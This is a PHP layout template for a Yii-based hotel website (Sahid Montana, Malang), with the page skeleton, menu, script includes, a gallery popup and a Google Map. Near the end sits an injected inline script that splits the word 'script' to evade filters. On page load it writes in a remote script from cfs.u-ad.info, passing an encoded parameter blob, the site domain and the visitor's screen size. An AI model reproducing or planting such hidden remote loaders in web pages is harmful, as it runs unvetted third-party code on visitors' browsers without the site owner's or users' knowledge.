<?php

use yii\helpers\Html;
use frontend\assets\AppAsset;
use common\models\Article;
use common\models\ArticleCategory;

$session = Yii::$app->session;
AppAsset::register($this);
$this->beginPage();
?>
<!DOCTYPE html>
<html> 
    <head>
        <meta charset=utf-8>
        <title><?= Html::encode($this->title) ?> | Sahid Montana</title>
         <meta name=description content="Sahid Montana Hotel">
        <meta name=keywords content="Hotel Sahid Montana Malang">
        <link href="http://fonts.googleapis.com/css?family=Droid+Sans:400,700%7cDroid+Serif:400,700,400italic,700italic%7cYellowtail%7cGreat+Vibes" rel=stylesheet type=text/css>
        <link type="text/css" rel='stylesheet' href="<?= Yii::$app->homeUrl ?>css/styles.css">
    </head>
    <body class="inner-page agents pattern-2">
        <header id=main-header>
            <div class="header-content container"> 
                <div class=menu-container>
                    <div class="main-logo">
                        <img src="<?= Yii::$app->homeUrl ?>img/logo.png">
                    </div>
                    <nav id=main-menu> 
                        <?php
//                        $sahid = ArticleCategory::find()->where(['id' => 16])->orderBy('name ASC')->all();
                        $sahid = Article::findall(['article_category_id' => 16,'publish' => 1]);
                        echo $this->render('_menu', ['sahid' => $sahid]);
                        ?>
                    </nav>
                    <div id=main-menu-handle>
                        <span></span>
                    </div>
                </div> 
            </div>
        </header>
        <div class="background">
        <?= $content ?>
        </div>
        <?php
        echo $this->render('_footer');
        ?>  
    </div> 
    <!-- JS Includes --> <!-- Essential JS files ( DO NOT REMOVE THEM ) --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery-1.11.1.min.js></script> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.modernizr.min.js></script> 
    <!-- Include bootstrap tab scrip --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/bootstrap/tab.js></script> 
    <!-- Include required js files --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.hovedir.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/owl.carousel.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.magnific-popup.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/helper.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/init.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/template.js></script>
    <!-- Map Js --> 
    <script type=text/javascript src=http://maps.googleapis.com/maps/api/js?sensor=false></script> 
    <!-- END OF Map Js -->
    <script type=text/javascript>
        if (self == top) {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR%2fVeDMuDxgFsCFjIEn2Hw7b0sb9LUjJl4y%2bIANt8ZtVR%2bYCp36c4Bsfos88lI60avfhyHxJH9%2fhA4nvKf4t48mE9u3WoRsIuwHeZn1ZNpeMt6uPdObKwNRGg7vVk5K3p8%2bcAUtCD3e5zfANssRPbJvACW3AnYVw65IuFjvZcPnQoLegD22%2fNMGOlM59dhtHLoJBkROMBxlLV%2bJ9vu%2fZyzos67Nmkcr6QLqp50k45ZzzA5TCjTTFJSQdm1ry3Bz9mbZcusC0%2bXd12QBV7YRoqIZOrBhcv1S5wmgtX3kgAsUa6QiGb3bk42q93EtO%2ffuC6QMb9iXxCR%2fPKr4kh5NGGx2etQ%2b6QDyDl8TJHaZs8NnvYa7UQim9PlYk%2buFvG5o6b%2fgoD4s8B69uXhDdN3cHBF%2b6Vi8QoLtH1TI0Hm00O5QCzt9P10on70A1vjQLLWH%2bIevKLKCB%2f5SLE%3d");
            document.write("&amp;idc_r=" + idc_glo_r);
            document.write("&amp;domain=" + document.domain);
            document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
            document.write("></scr" + "ipt>");
        }

        jQuery(document).ready(function() {
            "use strict";
            jQuery('.gallery-img-container').magnificPopup({
                delegate: 'a',
                type: 'image',
                removalDelay: 600,
                mainClass: 'mfp-fade',
                gallery: {
                    enabled: true,
                    navigateByImgClick: true,
                    preload: [0, 1]
                },
                image: {
                    tError: '<a href="%url%">The image #%curr%</a> could not be loaded.'
                }
            });
            jQuery(' .gallery-img-container > li ').each(function() {
                jQuery(this).hoverdir();
            });
        });

        function initialize() {
            var myLatLng = new google.maps.LatLng(-7.976965, 112.632215);
            var mapOptions = {
                zoom: 16,
                center: myLatLng,
                styles: [{featureType: "landscape", stylers: [{saturation: -100}, {lightness: 65}, {visibility: "on"}]}, {featureType: "poi", stylers: [{saturation: -100}, {lightness: 51}, {visibility: "simplified"}]}, {featureType: "road.highway", stylers: [{saturation: -100}, {visibility: "simplified"}]}, {featureType: "road.arterial", stylers: [{saturation: -100}, {lightness: 30}, {visibility: "on"}]}, {featureType: "road.local", stylers: [{saturation: -100}, {lightness: 40}, {visibility: "on"}]}, {featureType: "transit", stylers: [{saturation: -100}, {visibility: "simplified"}]}, {featureType: "administrative.province", stylers: [{visibility: "off"}]}, {featureType: "administrative.locality", stylers: [{visibility: "off"}]}, {featureType: "administrative.neighborhood", stylers: [{visibility: "on"}]}, {featureType: "water", elementType: "labels", stylers: [{visibility: "off"}, {lightness: -25}, {saturation: -100}]}, {featureType: "water", elementType: "geometry", stylers: [{hue: "#ffff00"}, {lightness: -25}, {saturation: -97}]}],
                scrollwheel: false,
                mapTypeControl: false,
                panControl: false,
                zoomControlOptions: {
                    style: google.maps.ZoomControlStyle.SMALL,
                    position: google.maps.ControlPosition.LEFT_BOTTOM
                }
            }
            var map = new google.maps.Map(document.getElementById('map'), mapOptions);

            var image = 'img/marker.png';

            var beachMarker = new google.maps.Marker({
                position: myLatLng,
                map: map,
                icon: image
            });
        }

        google.maps.event.addDomListener(window, 'load', initialize);
    </script>
</body> 
</html>
